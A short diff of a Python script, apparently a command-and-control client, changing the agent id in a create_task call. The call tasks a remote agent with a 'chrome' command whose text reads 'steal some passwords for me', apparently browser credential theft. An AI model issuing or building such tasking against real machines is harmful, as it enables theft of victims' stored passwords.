@@ -67,4 +67,4 @@ def create_task(command_type, cmd, agent_id):
 
 if __name__ == "__main__":
     # register(key, client_id, password)
-    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="7c1673635260c481d144d7e7685180a3")
+    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="8fb5de15fd79310d82eebedcf8ccf757")
